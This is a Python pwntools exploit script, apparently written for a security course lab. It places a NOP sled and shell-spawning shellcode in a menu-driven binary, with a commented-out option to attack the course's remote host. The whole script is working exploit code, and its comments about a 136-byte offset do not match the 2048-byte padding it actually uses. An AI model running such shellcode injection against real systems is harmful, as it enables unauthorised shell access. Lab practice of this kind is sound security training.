from pwn import *

# Set CPU context architecture
context.arch = "amd64"

# Shell call code
SHELLCODE = asm(shellcraft.amd64.linux.sh())
print("The shellcode payload is:", (SHELLCODE))
print("")

# Segmentation Fault is at offset 136, so we create 136 junk bytes
PADDING = (b"\x90"*2048)
print("The NOP Sled padding bytes are: ", PADDING)
print("")

# Payload
payload = (PADDING + SHELLCODE)
print("The full payload is :", payload)
print("")

# Launch exploit process
p = gdb.debug("./lab5-3.bin")            # run exploit against binary locally with process attached to gdb
#p = process("./lab5-3.bin")              # run exploit against binary locally without attacking the process to gdb
#p = remote("csc748.hostbin.org", 7053)   # run the exploit against a remote process
print("\n")

# Read prompt
getChoice = p.recvuntil("Choice: ")
print(getChoice)
#print("\n")

# Send option to load data
p.send('1')

# Read prompt
getLength = p.recvuntil("Length: ")
print(getLength)
#print("\n")

# Send length of load data
p.send('2048')

# Read prompt
getData = p.recvuntil("Data: ")
print(getData)
#print("\n")

# Send exploit bytes
p.send(payload)


# Read prompt
getChoice = p.recvuntil("Choice: ")
print(getChoice)
#print("\n")

"""
# Send option to exit
p.send(b"AA")

# Read prompt
getChoice = p.recvuntil("Enter search term: ")
print(getChoice)
#print("\n")
"""

# Send option to exit
p.send('3')

# Switch to interactive after gaining shell
p.interactive()


